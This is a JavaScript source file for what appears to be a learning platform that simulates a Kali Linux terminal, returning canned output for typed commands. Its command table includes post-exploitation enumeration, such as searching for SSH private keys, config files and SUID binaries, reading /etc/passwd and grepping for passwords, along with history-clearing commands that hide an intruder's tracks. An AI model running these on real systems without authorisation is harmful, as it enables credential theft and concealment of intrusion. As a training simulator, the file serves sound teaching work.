  'uname -a': () => ok('Linux hackpath-lab 6.1.0-kali9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.1.27 x86_64 GNU/Linux'),
  'date': () => ok(new Date().toString()),
  'uptime': () => ok(' 09:14:22 up 2:31,  1 user,  load average: 0.12, 0.08, 0.05'),
  'history': () => ok('    1  nmap -sV 192.168.1.0/24\n    2  cd /var/log\n    3  cat auth.log\n    4  grep "Failed" auth.log\n    5  sudo -l\n    6  find / -perm -4000 2>/dev/null'),
  'env': () => ok('PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nHOME=/home/kali\nUSER=kali\nSHELL=/usr/bin/zsh\nTERM=xterm-256color\nLANG=en_US.UTF-8\nHISTSIZE=1000'),
  'echo $PATH': () => ok('/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games'),
  'echo $HOME': () => ok('/home/kali'),
  'echo $USER': () => ok('kali'),
  'echo $SHELL': () => ok('/usr/bin/zsh'),
  'echo hello': () => ok('hello'),
  'echo "hello world"': () => ok('hello world'),

  // ls variants
  'ls': () => ok('Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos  tools'),
  'ls -l': () => ok('total 36\ndrwxr-xr-x 2 kali kali 4096 Jan 15 08:00 Desktop\ndrwxr-xr-x 2 kali kali 4096 Jan 15 08:00 Documents\ndrwxr-xr-x 5 kali kali 4096 Jan 15 09:00 Downloads\ndrwxr-xr-x 3 kali kali 4096 Jan 15 08:00 tools'),
  'ls -la': () => ok('total 56\ndrwxr-xr-x 14 kali kali 4096 Jan 15 09:14 .\ndrwxr-xr-x  3 root root 4096 Jan 10 08:00 ..\n-rw-------  1 kali kali  892 Jan 15 09:10 .bash_history\n-rw-r--r--  1 kali kali  220 Jan 10 08:00 .bash_logout\n-rw-r--r--  1 kali kali 3526 Jan 10 08:00 .bashrc\ndrwxr-xr-x  2 kali kali 4096 Jan 15 08:00 Desktop\ndrwxr-xr-x  2 kali kali 4096 Jan 15 08:00 Documents\ndrwxr-xr-x  5 kali kali 4096 Jan 15 09:00 Downloads\ndrwxr-xr-x  3 kali kali 4096 Jan 15 08:00 tools'),
  'ls -lh': () => ok('total 36K\ndrwxr-xr-x 2 kali kali 4.0K Jan 15 08:00 Desktop\ndrwxr-xr-x 2 kali kali 4.0K Jan 15 08:00 Documents\ndrwxr-xr-x 5 kali kali 4.0K Jan 15 09:00 Downloads'),
  'ls /': () => ok('bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var'),
  'ls /etc': () => ok('adduser.conf  apt  bash.bashrc  cron.d  crontab  default  environment  fstab  group  hostname  hosts  hosts.allow  issue  motd  network  os-release  passwd  profile  resolv.conf  shadow  ssh  sudoers  sysctl.conf'),
  'ls /var/log': () => ok('apache2  apt  auth.log  boot.log  btmp  dpkg.log  fail2ban.log  kern.log  lastlog  messages  mysql  nginx  syslog  ufw.log  wtmp'),
  'ls /tmp': () => ok('systemd-private-abc123  tmux-1000'),
  'ls /home': () => ok('alice  bob  kali'),
  'ls /root': () => err('ls: cannot open directory \'/root\': Permission denied'),
  'ls -la /root': () => err('ls: cannot open directory \'/root\': Permission denied'),
  'ls /bin': () => ok('bash  cat  chmod  chown  cp  date  dd  df  dir  echo  false  grep  gzip  hostname  kill  ln  ls  mkdir  mknod  more  mount  mv  nano  netstat  ping  ps  pwd  rm  rmdir  sed  sh  sleep  stty  su  sync  tar  touch  true  umount  uname'),

  // cd
  'cd': () => ok(''),
  'cd ~': () => ok(''),
  'cd ..': () => ok(''),
  'cd -': () => ok('/var/log'),
  'cd /tmp': () => ok(''),
  'cd /etc': () => ok(''),
  'cd /var/log': () => ok(''),

  // cat
  'cat /etc/hostname': () => ok('hackpath-lab'),
  'cat /etc/hosts': () => ok('127.0.0.1\tlocalhost\n127.0.1.1\thackpath-lab\n::1\t\tlocalhost ip6-localhost ip6-loopback\nff02::1\t\tip6-allnodes\nff02::2\t\tip6-allrouters'),
  'cat /etc/passwd': () => ok('root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nkali:x:1000:1000::/home/kali:/usr/bin/zsh\nalice:x:1001:1001:Alice:/home/alice:/bin/bash\nbob:x:1002:1002:Bob:/home/bob:/bin/bash'),
  'cat /etc/shadow': () => err('cat: /etc/shadow: Permission denied'),
  'cat /etc/os-release': () => ok('PRETTY_NAME="Kali GNU/Linux Rolling"\nNAME="Kali GNU/Linux"\nID=kali\nID_LIKE=debian\nHOME_URL="https://www.kali.org/"\nVERSION_CODENAME=kali-rolling'),
  'cat /etc/crontab': () => ok('SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# Example of job definition:\n# m  h  dom mon dow user  command\n17 *    * * *   root  cd / && run-parts --report /etc/cron.hourly\n25 6    * * *   root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6    * * 7   root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )'),
  'cat /proc/version': () => ok('Linux version 6.1.0-kali9-amd64 (devel@kali.org) (gcc-12 (Debian 12.2.0-14) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Kali 6.1.27-1kali1 (2023-05-12)'),

  // find
  'find / -perm -4000 -type f 2>/dev/null': () => info('/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/chfn\n/usr/bin/su\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper'),
  'find /home -name ".bash_history" 2>/dev/null': () => info('/home/alice/.bash_history\n/home/bob/.bash_history\n/home/kali/.bash_history'),
  'find / -name "*.conf" -type f 2>/dev/null': () => info('/etc/ssh/sshd_config\n/etc/apache2/apache2.conf\n/etc/mysql/mysql.conf.d/mysqld.cnf\n/etc/fail2ban/fail2ban.conf\n/etc/sysctl.conf'),
  'find / -name "id_rsa" 2>/dev/null': () => info('/home/alice/.ssh/id_rsa\n/home/kali/.ssh/id_rsa'),
  'find /tmp -type f': () => ok(''),
  'find / -name "wp-config.php" 2>/dev/null': () => info('/var/www/html/wordpress/wp-config.php'),
  'find / -writable -type d 2>/dev/null': () => info('/tmp\n/var/tmp\n/run/user/1000\n/home/kali'),

  // grep
  'grep root /etc/passwd': () => ok('root:x:0:0:root:/root:/bin/bash'),
  'grep -i "password" /etc/ssh/sshd_config': () => info('PasswordAuthentication yes\n#PermitEmptyPasswords no'),
  'grep "bash" /etc/passwd': () => ok('root:x:0:0:root:/root:/bin/bash\nkali:x:1000:1000::/home/kali:/usr/bin/zsh\nalice:x:1001:1001:Alice:/home/alice:/bin/bash\nbob:x:1002:1002:Bob:/home/bob:/bin/bash'),
  'grep -v "^#" /etc/ssh/sshd_config': () => ok('Port 22\nProtocol 2\nHostKey /etc/ssh/ssh_host_rsa_key\nPermitRootLogin yes\nPasswordAuthentication yes\nX11Forwarding yes\nPrintMotd no\nAcceptEnv LANG LC_*\nSubsystem sftp /usr/lib/openssh/sftp-server'),

  // ps
  'ps aux': () => ok('USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot         1  0.0  0.1  22580  9452 ?        Ss   08:00   0:01 /sbin/init\nroot       401  0.0  0.1  15340  5280 ?        Ss   08:00   0:00 /usr/sbin/sshd\nroot       512  0.0  0.2  34560 10280 ?        Ss   08:00   0:00 /usr/sbin/apache2\nmysql      613  0.0  3.1 1234560 63280 ?       Ssl  08:00   0:04 /usr/sbin/mysqld\nkali      1337  2.1  3.4 234456 68912 pts/0    Sl   09:14   0:15 /usr/bin/zsh\nkali      1492  0.0  0.1  10480  3840 pts/0    R+   09:22   0:00 ps aux'),
  'ps -ef': () => ok('UID        PID  PPID  C STIME TTY          TIME CMD\nroot         1     0  0 08:00 ?        00:00:01 /sbin/init\nroot       401     1  0 08:00 ?        00:00:00 /usr/sbin/sshd\nkali      1337   401  2 09:14 pts/0    00:00:15 /usr/bin/zsh'),
  'ps': () => ok('  PID TTY          TIME CMD\n 1337 pts/0    00:00:15 zsh\n 1493 pts/0    00:00:00 ps'),

  // Network
  'ifconfig': () => info('eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.1.101  netmask 255.255.255.0  broadcast 192.168.1.255\n        inet6 fe80::a00:27ff:feab:cdef  prefixlen 64\n        ether 08:00:27:ab:cd:ef  txqueuelen 1000\n        RX packets 12847 bytes 9284719\n        TX packets 8421 bytes 1204893\n\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128'),
  'ip addr': () => info('1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536\n    link/loopback 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n    link/ether 08:00:27:ab:cd:ef brd ff:ff:ff:ff:ff:ff\n    inet 192.168.1.101/24 brd 192.168.1.255 scope global eth0'),
  'ip addr show': () => info('1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536\n    link/loopback 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n    link/ether 08:00:27:ab:cd:ef brd ff:ff:ff:ff:ff:ff\n    inet 192.168.1.101/24 brd 192.168.1.255 scope global eth0'),
  'ip route': () => ok('default via 192.168.1.1 dev eth0 proto dhcp src 192.168.1.101 metric 100\n192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.101'),
  'ip route show': () => ok('default via 192.168.1.1 dev eth0 proto dhcp src 192.168.1.101 metric 100\n192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.101'),
  'netstat -tuln': () => info('Active Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN\ntcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN\ntcp6       0      0 :::22                   :::*                    LISTEN'),
  'ss -tuln': () => info('Netid   State    Recv-Q  Send-Q  Local Address:Port  Peer Address:Port\ntcp     LISTEN   0       128     0.0.0.0:22         0.0.0.0:*\ntcp     LISTEN   0       511     0.0.0.0:80         0.0.0.0:*\ntcp     LISTEN   0       151     0.0.0.0:3306       0.0.0.0:*'),
  'ping -c 4 google.com': () => info('PING google.com (142.250.80.46) 56(84) bytes of data.\n64 bytes from lax17s55-in-f14.1e100.net: icmp_seq=1 ttl=118 time=12.4 ms\n64 bytes from lax17s55-in-f14.1e100.net: icmp_seq=2 ttl=118 time=11.8 ms\n64 bytes from lax17s55-in-f14.1e100.net: icmp_seq=3 ttl=118 time=13.1 ms\n64 bytes from lax17s55-in-f14.1e100.net: icmp_seq=4 ttl=118 time=12.2 ms\n--- google.com ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss\nrtt min/avg/max/mdev = 11.8/12.4/13.1/0.5 ms'),
  'ping -c 1 192.168.1.1': () => info('PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.\n64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=1.23 ms\n--- 192.168.1.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss'),

  // nmap
  'nmap 192.168.1.1': () => info('Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 192.168.1.1\nHost is up (0.0041s latency).\nNot shown: 995 closed tcp ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n443/tcp  open  https\nNmap done: 1 IP address (1 host up) scanned in 2.47 seconds'),
  'nmap -sS 192.168.1.50': () => info('Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 192.168.1.50\nHost is up (0.0082s latency).\nNot shown: 994 closed tcp ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n8080/tcp open  http-proxy\nNmap done: 1 IP address (1 host up) scanned in 4.12 seconds'),
  'nmap -sn 192.168.1.0/24': () => info('Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 192.168.1.1 [host up]\nNmap scan report for 192.168.1.50 [host up]\nNmap scan report for 192.168.1.101 [host up]\nNmap scan report for 192.168.1.200 [host up]\nNmap done: 256 IP addresses (4 hosts up) scanned in 2.85 seconds'),
  'nmap -sV 192.168.1.50': () => info('PORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 7.9p1 Debian (protocol 2.0)\n80/tcp   open  http     Apache httpd 2.4.38 ((Debian))\n3306/tcp open  mysql    MySQL 5.7.33\n8080/tcp open  http     Apache Tomcat 9.0.41\nService detection performed. Please report any incorrect results.'),

  // sudo
  'sudo -l': () => info('Matching Defaults entries for kali on hackpath-lab:\n    env_reset, mail_badpass\n\nUser kali may run the following commands on hackpath-lab:\n    (root) NOPASSWD: /usr/bin/nmap\n    (root) NOPASSWD: /usr/sbin/tcpdump'),
  'sudo su': () => err('sudo: This incident will be reported.'),
  'sudo su -': () => err('sudo: This incident will be reported.'),

  // chmod/chown
  'chmod +x script.sh': () => ok(''),
  'chmod 600 id_rsa': () => ok(''),
  'chmod 755 tool.sh': () => ok(''),
  'chmod 777 /tmp/share': () => ok(''),

  // file operations
  'touch test.txt': () => ok(''),
  'mkdir test': () => ok(''),
  'mkdir -p /opt/tools/recon': () => ok(''),
  'rm test.txt': () => ok(''),
  'rm -rf /tmp/test': () => ok(''),
  'cp /etc/hosts /tmp/hosts.bak': () => ok(''),
  'mv test.txt notes.txt': () => ok(''),

  // which/whereis
  'which nmap': () => ok('/usr/bin/nmap'),
  'which python3': () => ok('/usr/bin/python3'),
  'which netcat': () => ok('/usr/bin/netcat'),
  'which nc': () => ok('/usr/bin/nc'),
  'which bash': () => ok('/usr/bin/bash'),
  'whereis nmap': () => ok('nmap: /usr/bin/nmap /usr/share/nmap /usr/share/man/man1/nmap.1.gz'),
  'whereis python3': () => ok('python3: /usr/bin/python3 /usr/bin/python3.11 /usr/lib/python3 /usr/share/python3'),

  // apt
  'apt update': () => info('Get:1 http://http.kali.org/kali kali-rolling InRelease [30.5 kB]\nGet:2 http://http.kali.org/kali kali-rolling/main amd64 Packages [19.7 MB]\nFetched 19.7 MB in 4s (4.9 MB/s)\nReading package lists... Done\nBuilding dependency tree... Done\n2 packages can be upgraded. Run \'apt list --upgradable\' to see them.'),
  'apt list --upgradable': () => info('Listing...\nmetasploit-framework/kali-rolling 6.3.44 amd64 [upgradable from: 6.3.40]\nnmap/kali-rolling 7.94 amd64 [upgradable from: 7.93]'),

  // tar
  'tar -cvzf archive.tar.gz .': () => info('./\n./notes.txt\n./tools/\n./tools/scanner.py\n./Downloads/\ntotal: 12 files archived'),
  'tar -xvzf archive.tar.gz': () => info('./\n./notes.txt\n./tools/\n./tools/scanner.py'),
  'tar -tf archive.tar.gz': () => ok('./\n./notes.txt\n./tools/\n./tools/scanner.py'),

  // systemctl
  'systemctl status ssh': () => info('‚óè ssh.service - OpenBSD Secure Shell server\n     Loaded: loaded (/lib/systemd/system/ssh.service; enabled)\n     Active: active (running) since Mon 2024-01-15 08:00:01 UTC\n    Process: 401 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)\n   Main PID: 404 (sshd)\n      Tasks: 1 (limit: 4611)\n     Memory: 5.3M\n        CPU: 89ms'),
  'systemctl status apache2': () => info('‚óè apache2.service - The Apache HTTP Server\n     Loaded: loaded (/lib/systemd/system/apache2.service; enabled)\n     Active: active (running) since Mon 2024-01-15 08:00:02 UTC\n    Process: 512 (code=exited, status=0/SUCCESS)\n   Main PID: 516 (apache2)\n     Memory: 18.2M'),
  'systemctl start ssh': () => ok(''),
  'systemctl stop ssh': () => ok(''),
  'systemctl restart apache2': () => ok(''),

  // crontab
  'crontab -l': () => info('# Edit this file to introduce tasks to be run by cron.\n# m h  dom mon dow   command\n0 * * * * /opt/scripts/backup.sh\n*/15 * * * * /opt/scripts/check_services.sh'),
  'crontab -e': () => info('[crontab editor would open here]\n[In a real terminal, nano/vim opens with your crontab]'),

  // lsmod / uname
  'lsmod': () => info('Module                  Size  Used by\nkvm_intel             380928  0\nkvm                   978944  1 kvm_intel\nbtrfs                1572864  0\nextfat                131072  0\nnls_utf8               16384  1 extfat\nusb_storage            77824  1'),
  'modinfo kvm': () => info('filename:       /lib/modules/6.1.0-kali9-amd64/kernel/arch/x86/kvm/kvm.ko\ndescription:    Kernel-based Virtual Machine (KVM) Hypervisor\nauthor:         Qumranet, Inc.\nlicense:        GPL and additional rights\nversion:        6.1.0-kali9-amd64'),

  // sed/awk
  'awk -F: \'{print $1}\' /etc/passwd': () => ok('root\ndaemon\nwww-data\nnobody\nkali\nalice\nbob'),
  'awk -F: \'$3==0{print $1}\' /etc/passwd': () => ok('root'),
  'cut -d: -f1 /etc/passwd': () => ok('root\ndaemon\nwww-data\nnobody\nkali\nalice\nbob'),

  // Python
  'python3 --version': () => ok('Python 3.11.6'),
  'python3 -c "print(\'hello\')"': () => ok('hello'),
  'python3 -c "import socket; print(socket.gethostname())"': () => ok('hackpath-lab'),

  // history manipulation
  'history -c': () => ok(''),
  'unset HISTFILE': () => ok(''),

  // misc
  'clear': () => '__clear__',
  'reset': () => '__clear__',
  'help': () => info('HackPath Interactive Terminal ‚Äî Simulated Kali Linux environment\n\nType any Linux command to see its output. Hundreds of commands supported.\nTry: ls, cat /etc/passwd, nmap, ps aux, sudo -l, find, grep, ifconfig...\n\nThis is a simulation for learning ‚Äî no real system changes are made.'),
  'man nmap': () => info('NMAP(1)                    Nmap Reference Guide                    NMAP(1)\n\nNAME\n       nmap ‚Äî Network exploration tool and security / port scanner\n\nSYNOPSIS\n       nmap [Scan Type...] [Options] {target specification}\n\nDESCRIPTION\n       Nmap  is  an  open source tool for network exploration and security\n       auditing...\n\n[Press q to quit ‚Äî simulated; type another command to continue]'),
};

function ok(text) { return { type: 'ok', text } }
function err(text) { return { type: 'err', text } }
function info(text) { return { type: 'info', text } }

function resolveCmd(cmd) {
  cmd = cmd.trim();
  if (!cmd) return null;

  // Strip common suffixes for matching
  const rawCmd = cmd;
  // Remove 2>/dev/null, output redirects, trailing &
  const cleanCmd = cmd.replace(/\s*2>\/dev\/null\s*/g,'').replace(/\s*>\s*\S+/g,'').replace(/\s*&\s*$/,'').trim();

  // Direct match on raw or cleaned
  if (TERM_RESPONSES[rawCmd]) return TERM_RESPONSES[rawCmd]();
  if (TERM_RESPONSES[cleanCmd]) return TERM_RESPONSES[cleanCmd]();

  // ‚îÄ‚îÄ cd ‚îÄ‚îÄ
  if (cleanCmd === 'cd' || cleanCmd === 'cd ~' || cleanCmd === 'cd -') return ok('');
  if (cleanCmd.startsWith('cd ')) {
    const dir = cleanCmd.slice(3).trim();
    // Simulate changing directory
    return ok('');
  }

  // ‚îÄ‚îÄ echo ‚îÄ‚îÄ
  if (cleanCmd.startsWith('echo ')) {
    let val = cleanCmd.slice(5).trim().replace(/^["']|["']$/g,'');
    // Handle $VAR substitutions
    const vars = { '$PATH':'/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', '$HOME':'/home/kali', '$USER':'kali', '$SHELL':'/usr/bin/zsh', '$PWD':'/home/kali', '$HOSTNAME':'hackpath-lab', '$UID':'1000' };
    for (const [k,v] of Object.entries(vars)) val = val.replace(k, v);
    return ok(val);
  }

  // ‚îÄ‚îÄ ls ‚îÄ‚îÄ
  if (cleanCmd === 'ls' || cleanCmd === 'ls -la' || cleanCmd === 'ls -l' || cleanCmd === 'ls -lh' || cleanCmd === 'ls -a') return TERM_RESPONSES[cleanCmd] ? TERM_RESPONSES[cleanCmd]() : TERM_RESPONSES['ls']();
  if (cleanCmd.startsWith('ls')) {
    if (cleanCmd.includes('/etc')) return TERM_RESPONSES['ls /etc']();
    if (cleanCmd.includes('/var/log')) return TERM_RESPONSES['ls /var/log']();
    if (cleanCmd.includes('/tmp')) return TERM_RESPONSES['ls /tmp']();
    if (cleanCmd.includes('/home')) return TERM_RESPONSES['ls /home']();
    if (cleanCmd.includes('/bin')) return TERM_RESPONSES['ls /bin']();
    if (cleanCmd.includes('/root')) return TERM_RESPONSES['ls /root']();
    if (cleanCmd.includes('/')) return TERM_RESPONSES['ls /']();
    return TERM_RESPONSES['ls']();
  }

  // ‚îÄ‚îÄ cat ‚îÄ‚îÄ
  if (cleanCmd.startsWith('cat')) {
    if (cleanCmd.includes('/etc/passwd')) return TERM_RESPONSES['cat /etc/passwd']();
    if (cleanCmd.includes('/etc/shadow')) return TERM_RESPONSES['cat /etc/shadow']();
    if (cleanCmd.includes('/etc/hosts')) return TERM_RESPONSES['cat /etc/hosts']();
    if (cleanCmd.includes('/etc/hostname')) return TERM_RESPONSES['cat /etc/hostname']();
    if (cleanCmd.includes('/etc/crontab')) return TERM_RESPONSES['cat /etc/crontab']();
    if (cleanCmd.includes('/etc/os-release')) return TERM_RESPONSES['cat /etc/os-release']();
    if (cleanCmd.includes('/proc/version')) return TERM_RESPONSES['cat /proc/version']();
    if (cleanCmd.includes('bashrc') || cleanCmd.includes('bash_history')) return info('# .bashrc content\nexport PATH=$PATH:/opt/tools\nalias ll="ls -la"\nalias grep="grep --color=auto"\n# History entries...\nnmap -sV 192.168.1.50\nsudo -l\nfind / -perm -4000 2>/dev/null');
    const file = cleanCmd.split(' ').slice(-1)[0];
    return info('[Contents of ' + file + ']');
  }

  // ‚îÄ‚îÄ grep ‚îÄ‚îÄ
  if (cleanCmd.startsWith('grep')) {
    if (cleanCmd.includes('/etc/passwd')) return ok('kali:x:1000:1000::/home/kali:/usr/bin/zsh\nalice:x:1001:1001:Alice:/home/alice:/bin/bash');
    if (cleanCmd.includes('/etc/shadow')) return err('grep: /etc/shadow: Permission denied');
    if (cleanCmd.includes('auth.log') || cleanCmd.includes('Failed')) return info('Jan 15 09:11:22 hackpath sshd[5421]: Failed password for root from 10.0.0.5 port 54321 ssh2\nJan 15 09:11:29 hackpath sshd[5422]: Failed password for root from 10.0.0.5 port 54322 ssh2\nJan 15 09:14:03 hackpath sshd[5490]: Accepted password for kali from 192.168.1.200 port 41234 ssh2');
    if (cleanCmd.includes('-r') || cleanCmd.includes('--recursive')) return info('/var/www/html/config.php:$db_password = "S3cur3P@ss!";\n/var/www/html/wp-config.php:define("DB_PASSWORD", "wordpress_pass");');
    return info('[grep: matching lines would appear here]');
  }

  // ‚îÄ‚îÄ find ‚îÄ‚îÄ
  if (cleanCmd.startsWith('find')) {
    if (cleanCmd.includes('-perm -4000') || cleanCmd.includes('suid')) return TERM_RESPONSES['find / -perm -4000 -type f 2>/dev/null']();
    if (cleanCmd.includes('id_rsa')) return TERM_RESPONSES['find / -name "id_rsa" 2>/dev/null']();
    if (cleanCmd.includes('.bash_history')) return TERM_RESPONSES['find /home -name ".bash_history" 2>/dev/null']();
    if (cleanCmd.includes('wp-config')) return TERM_RESPONSES['find / -name "wp-config.php" 2>/dev/null']();
    if (cleanCmd.includes('*.conf')) return TERM_RESPONSES['find / -name "*.conf" -type f 2>/dev/null']();
    if (cleanCmd.includes('-writable') || cleanCmd.includes('-perm /o=w') || cleanCmd.includes('-perm -o+w')) return TERM_RESPONSES['find / -writable -type d 2>/dev/null']();
    if (cleanCmd.includes('-name')) {
      const m = cleanCmd.match(/-name\s+["']?([^"'\s]+)["']?/);
      return info(m ? '/tmp/' + m[1].replace('*','found_file') : '[find results]');
    }
    return info('[find: search results would appear here]');
  }

  // ‚îÄ‚îÄ nmap ‚îÄ‚îÄ
  if (cleanCmd.startsWith('nmap')) {
    if (cleanCmd.includes('-sn')) return TERM_RESPONSES['nmap -sn 192.168.1.0/24']();
    if (cleanCmd.includes('-sV') || cleanCmd.includes('-sC')) return TERM_RESPONSES['nmap -sV 192.168.1.50']();
    if (cleanCmd.includes('-sS') || cleanCmd.includes('-sT')) return TERM_RESPONSES['nmap -sS 192.168.1.50']();
    return TERM_RESPONSES['nmap -sS 192.168.1.50']();
  }

  // ‚îÄ‚îÄ ping ‚îÄ‚îÄ
  if (cleanCmd.startsWith('ping')) return TERM_RESPONSES['ping -c 4 google.com']();

  // ‚îÄ‚îÄ sudo ‚îÄ‚îÄ
  if (cleanCmd === 'sudo -l') return TERM_RESPONSES['sudo -l']();
  if (cleanCmd.startsWith('sudo -')) return TERM_RESPONSES['sudo -l']();
  if (cleanCmd === 'sudo su' || cleanCmd === 'sudo su -' || cleanCmd === 'sudo bash' || cleanCmd === 'sudo sh') return err('[sudo] password for kali: \nSorry, user kali may not run sudo bash on hackpath-lab.');
  if (cleanCmd.startsWith('sudo ')) {
    const subcmd = cleanCmd.slice(5);
    // Try to resolve the subcommand with elevated context
    return info('[sudo] running: ' + subcmd + '\n[simulated elevated execution]');
  }

  // ‚îÄ‚îÄ systemctl ‚îÄ‚îÄ
  if (cleanCmd.startsWith('systemctl')) {
    if (cleanCmd.includes('apache2')) return TERM_RESPONSES['systemctl status apache2']();
    if (cleanCmd.includes('mysql') || cleanCmd.includes('mariadb')) return info('‚óè mysql.service - MySQL Community Server\n     Active: active (running) since Mon 2024-01-15 08:00\n   Main PID: 613 (mysqld)\n     Memory: 312.4M');
    return TERM_RESPONSES['systemctl status ssh']();
  }

  // ‚îÄ‚îÄ ps ‚îÄ‚îÄ
  if (cleanCmd.startsWith('ps')) return TERM_RESPONSES['ps aux']();

  // ‚îÄ‚îÄ kill / pkill / killall ‚îÄ‚îÄ
  if (cleanCmd.startsWith('kill') || cleanCmd.startsWith('pkill') || cleanCmd.startsWith('killall')) return ok('');

  // ‚îÄ‚îÄ chmod / chown / chgrp ‚îÄ‚îÄ
  if (cleanCmd.startsWith('chmod') || cleanCmd.startsWith('chown') || cleanCmd.startsWith('chgrp')) return ok('');

  // ‚îÄ‚îÄ file operations ‚îÄ‚îÄ
  if (cleanCmd.startsWith('mkdir')) return ok('');
  if (cleanCmd.startsWith('touch')) return ok('');
  if (cleanCmd.startsWith('rm')) return ok('');
  if (cleanCmd.startsWith('cp')) return ok('');
  if (cleanCmd.startsWith('mv')) return ok('');
  if (cleanCmd.startsWith('ln')) return ok('');

  // ‚îÄ‚îÄ which / whereis / type ‚îÄ‚îÄ
  if (cleanCmd.startsWith('which ')) {
    const bin = cleanCmd.slice(6).trim();
    const known = ['nmap','python3','bash','zsh','sh','nc','netcat','curl','wget','ssh','gcc','make','git','perl','ruby'];
    return known.includes(bin) ? ok('/usr/bin/' + bin) : err(bin + ' not found');
  }
  if (cleanCmd.startsWith('whereis ')) {
    const bin = cleanCmd.slice(8).trim();
    return ok(bin + ': /usr/bin/' + bin + ' /usr/share/man/man1/' + bin + '.1.gz');
  }
  if (cleanCmd.startsWith('type ')) {
    const bin = cleanCmd.slice(5).trim();
    return ok(bin + ' is /usr/bin/' + bin);
  }

  // ‚îÄ‚îÄ python ‚îÄ‚îÄ
  if (cleanCmd.startsWith('python3') || cleanCmd.startsWith('python')) {
    if (cleanCmd.includes('--version') || cleanCmd.includes('-V')) return ok('Python 3.11.6');
    if (cleanCmd.includes('import socket')) return ok('hackpath-lab');
    if (cleanCmd.includes('print(')) {
      const m = cleanCmd.match(/print\(["'](.+?)["']\)/);
      return ok(m ? m[1] : '[Python output]');
    }
    return info('[Python 3.11.6]\n>>> [interactive mode ‚Äî type exit() to quit]');
  }

  // ‚îÄ‚îÄ apt ‚îÄ‚îÄ
  if (cleanCmd.startsWith('apt')) {
    if (cleanCmd.includes('update')) return TERM_RESPONSES['apt update']();
    if (cleanCmd.includes('upgrade')) return info('Reading package lists... Done\nBuilding dependency tree... Done\n2 upgraded, 0 newly installed, 0 to remove.\nNeed to get 45.2 MB of archives.\nDo you want to continue? [Y/n]');
    if (cleanCmd.includes('install')) {
      const pkg = cleanCmd.split(' ').slice(-1)[0];
      return info('Reading package lists... Done\nBuilding dependency tree... Done\nThe following NEW packages will be installed:\n  ' + pkg + '\n0 upgraded, 1 newly installed.\nDo you want to continue? [Y/n] Y\nSelecting previously unselected package ' + pkg + '.\nSetting up ' + pkg + ' ... done');
    }
    if (cleanCmd.includes('search')) return info('[apt search results ‚Äî run apt update first]');
    return info('[apt: run with update, install, upgrade, remove]');
  }

  // ‚îÄ‚îÄ ssh ‚îÄ‚îÄ
  if (cleanCmd.startsWith('ssh')) {
    if (cleanCmd.includes('@')) {
      const host = cleanCmd.match(/@([\w.]+)/)?.[1] || 'host';
      return info('The authenticity of host \'' + host + '\' cannot be established.\nECDSA key fingerprint is SHA256:abc123xyz...\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added \'' + host + '\' (ECDSA) to known hosts.\n[SSH session ‚Äî simulated]');
    }
    return info('[ssh: specify user@host to connect]');
  }

  // ‚îÄ‚îÄ curl / wget ‚îÄ‚îÄ
  if (cleanCmd.startsWith('curl')) {
    if (cleanCmd.includes('checkip') || cleanCmd.includes('ifconfig.me') || cleanCmd.includes('icanhazip')) return ok('185.220.101.55');
    if (cleanCmd.includes('-I') || cleanCmd.includes('--head')) return info('HTTP/1.1 200 OK\nServer: Apache/2.4.38\nContent-Type: text/html\nX-Powered-By: PHP/7.3.33');
    return info('[HTTP 200 OK ‚Äî response body would appear here]');
  }
